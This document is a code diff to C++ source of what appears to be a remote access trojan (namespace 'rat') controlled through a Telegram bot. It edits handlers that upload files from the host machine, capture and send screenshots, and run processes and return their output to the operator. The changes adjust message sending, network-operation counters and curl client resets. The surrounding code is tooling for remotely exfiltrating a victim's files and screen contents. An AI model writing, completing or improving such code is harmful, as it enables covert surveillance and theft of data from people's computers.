@@ -32,18 +32,22 @@ void Handler::handleGetCommand() {
 
   if (file_size < 2 * 1024 * KB) {
     // small file → sync
-    this->bot->sendFile(file_path);
+    this->sendFile(file_path);
   } else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) {
     this->long_process_pool->enqueue([this, &file_path] {
       HANDLER_DEBUG_LOG("Async upload {}", file_path.string());
       std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
-      this->sendBackingMessage(
+      const auto &send_message_result = this->backing_bot->sendMessage(
           fmt::format("File: {} will be uploaded", file_path.string()));
+      if (send_message_result == ::rat::tbot::BotResponse::SUCCESS) {
+        this->backing_bot_net_ops_counter++;
+      }
       auto resp = this->backing_bot->sendFile(file_path);
-
       if (resp != rat::tbot::BotResponse::SUCCESS) {
         HANDLER_ERROR_LOG("Failed to upload {}", file_path.string());
       }
+      this->backing_bot->curl_client.reset();
+      this->backing_bot_net_ops_counter = 0;
     });
   } else {
     this->sendMessage(fmt::format("File too big for Telegram (max 50 MB "
@@ -68,11 +72,15 @@ void Handler::handleScreenshotCommand() {
       if (this->backing_bot->sendPhoto(image_path) !=
           rat::tbot::BotResponse::SUCCESS) {
         HANDLER_ERROR_LOG("Failed uploading {}", image_path.string());
+        this->backing_bot->sendMessage("Failed at sending screenshot");
+        this->backing_bot_net_ops_counter++;
       }
     }
     if (!output_buffer.empty()) {
       this->sendBackingMessage(output_buffer);
     }
+    this->backing_bot->curl_client.reset();
+    this->backing_bot_net_ops_counter = 0;
     rat::system::removeFile(image_path);
   });
 
@@ -116,9 +124,9 @@ void Handler::handleProcessCommand() {
 
     this->backing_bot_mutex.lock();
 
-    this->sendBackingMessage(
+    this->backing_bot->sendMessage(
         fmt::format("Process launched ID: {}", process_id));
-
+    this->backing_bot_net_ops_counter++;
     const int process_exit_code = process.get_exit_status();
 
     const std::string final_message =
@@ -127,7 +135,8 @@ void Handler::handleProcessCommand() {
 
     constexpr size_t TELEGRAM_LIMIT = 3000; // 3 KB safe cap
     if (final_message.size() <= TELEGRAM_LIMIT) {
-      this->sendBackingMessage(final_message);
+      this->backing_bot->sendMessage(final_message);
+      this->backing_bot_net_ops_counter++;
     } else {
       const std::string filename = fmt::format(
           "process-{}.txt", ::rat::system::getCurrentDateTime_Underscored());
@@ -138,6 +147,8 @@ void Handler::handleProcessCommand() {
       this->backing_bot->sendFile(
           filename, "Process output too large, see attached file.");
       std::filesystem::remove(filename);
+      this->backing_bot->curl_client.reset();
+      this->backing_bot_net_ops_counter = 0;
     }
     this->backing_bot_mutex.unlock();
   });
